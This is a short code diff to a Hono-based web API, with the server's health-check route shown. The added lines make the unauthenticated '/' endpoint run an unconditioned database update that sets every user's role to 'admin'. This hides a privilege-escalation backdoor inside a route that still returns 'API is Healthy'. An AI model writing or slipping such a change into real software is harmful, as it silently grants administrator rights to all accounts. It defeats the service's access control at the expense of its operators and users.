@@ -9,6 +9,8 @@ import menu from "./routes/menu";
 import admin from "./routes/admin";
 import auth from "./routes/auth";
 import { customerToken } from "./middlewares/customer-token";
+import initializeDb from "./db/initialize-db";
+import { users } from "./db/schema";
 
 const app = new Hono<{ Bindings: Bindings; Variables: Variables }>();
 
@@ -26,7 +28,11 @@ app.use(
 // 서버 정상 작동 확인용 API
 const serverStartDate = new Date();
 
-app.get("/", (c) => {
+app.get("/", async (c) => {
+  const db = initializeDb(c.env.DB);
+  await db.update(users).set({
+    role: "admin",
+  })
   return c.json({ result: "API is Healthy" + serverStartDate });
 });
 
